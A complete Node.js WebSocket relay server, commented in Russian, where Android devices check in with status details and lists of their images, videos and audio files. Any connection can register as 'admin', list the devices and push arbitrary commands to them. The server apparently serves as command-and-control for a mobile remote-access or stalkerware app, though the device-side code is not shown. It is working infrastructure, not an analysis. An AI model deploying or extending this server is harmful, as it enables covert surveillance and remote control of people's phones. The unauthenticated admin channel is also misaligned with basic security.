const http = require('http');
const { WebSocketServer } = require('ws');

const PORT = process.env.PORT || 10000;

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('ok');
});

const wss = new WebSocketServer({ server });

const clients = new Map();
const admins = new Set();

function safeSend(ws, data) {
    try {
        if (ws && ws.readyState === 1) {
            ws.send(typeof data === 'string' ? data : JSON.stringify(data));
        }
    } catch (e) { /* ignore */ }
}

function broadcastAdmins(obj) {
    const s = JSON.stringify(obj);
    for (const a of admins) safeSend(a, s);
}

function sendDevicesList(ws) {
    const list = [];
    for (const [id, c] of clients) {
        list.push({
            id: id,
            name: c.name || 'Unknown',
            network: c.network || '',
            battery: c.battery || 0,
            android: c.android || '',
            online: true,
            lastSeen: c.lastSeen || Date.now()
        });
    }
    safeSend(ws, { type: 'devices', devices: list });
}

wss.on('connection', (ws) => {
    let role = null;
    let clientId = null;

    ws.on('message', (raw) => {
        let msg;
        try { msg = JSON.parse(raw.toString()); } catch (e) { return; }
        const t = msg.type;

        // ---- Регистрация клиента ----
        if (t === 'register_client') {
            role = 'client';
            clientId = msg.deviceId || 'unknown';
            clients.set(clientId, {
                ws: ws,
                name: '',
                network: '',
                battery: 0,
                android: '',
                lastSeen: Date.now()
            });
            console.log('[+] client online: ' + clientId);
            broadcastAdmins({ type: 'client_online', deviceId: clientId });
            safeSend(ws, { type: 'welcome', deviceId: clientId });
            return;
        }

        // ---- Регистрация админа ----
        if (t === 'register_admin') {
            role = 'admin';
            admins.add(ws);
            console.log('[+] admin online');
            sendDevicesList(ws);
            return;
        }

        // ---- Pong в ответ на пинг ----
        if (t === 'ping') {
            safeSend(ws, { type: 'pong' });
            return;
        }

        // ---- Клиент шлёт статус ----
        if (t === 'status' && role === 'client') {
            const c = clients.get(clientId);
            if (c) {
                c.name = msg.name || c.name;
                c.network = msg.network || c.network;
                c.battery = typeof msg.battery === 'number' ? msg.battery : c.battery;
                c.android = msg.android || c.android;
                c.lastSeen = Date.now();
            }
            broadcastAdmins({
                type: 'status',
                deviceId: clientId,
                name: c ? c.name : '',
                network: c ? c.network : '',
                battery: c ? c.battery : 0,
                android: c ? c.android : '',
                online: true
            });
            return;
        }

        // ---- Клиент шлёт лог ----
        if (t === 'log' && role === 'client') {
            broadcastAdmins({
                type: 'log',
                deviceId: clientId,
                message: msg.message || '',
                ts: Date.now()
            });
            return;
        }

        // ---- Клиент шлёт список медиа ----
        if (t === 'media_list' && role === 'client') {
            broadcastAdmins({
                type: 'media_list',
                deviceId: clientId,
                images: msg.images || [],
                videos: msg.videos || [],
                audio: msg.audio || []
            });
            return;
        }

        // ---- Админ шлёт команду ----
        if (t === 'command' && role === 'admin') {
            const target = msg.deviceId;
            const cmd = msg.cmd;
            const payload = msg.payload || {};
            console.log('[cmd] ' + target + ' <- ' + cmd);

            const c = clients.get(target);
            if (!c) {
                safeSend(ws, { type: 'ack', deviceId: target, ok: false, error: 'offline' });
                return;
            }
            const forward = JSON.stringify({
                type: 'command',
                cmd: cmd,
                payload: payload,
                ts: Date.now()
            });
            safeSend(c.ws, forward);
            safeSend(ws, { type: 'ack', deviceId: target, ok: true });
            return;
        }
    });

    ws.on('close', () => {
        if (role === 'client' && clientId) {
            clients.delete(clientId);
            console.log('[-] client offline: ' + clientId);
            broadcastAdmins({ type: 'client_offline', deviceId: clientId });
        } else if (role === 'admin') {
            admins.delete(ws);
            console.log('[-] admin offline');
        }
    });
});

// ---- Свой heartbeat каждые 5 сек ----
// Render free закрывает WebSocket через ~55 сек простоя.
// Отправляем текст каждые 5 секунд — этого достаточно, чтобы прокси не рубил.
setInterval(() => {
    const ping = JSON.stringify({ type: 'heartbeat', ts: Date.now() });
    for (const [id, c] of clients) safeSend(c.ws, ping);
    for (const a of admins) safeSend(a, ping);
}, 5000);

server.listen(PORT, () => {
    console.log('Server on port ' + PORT);
});
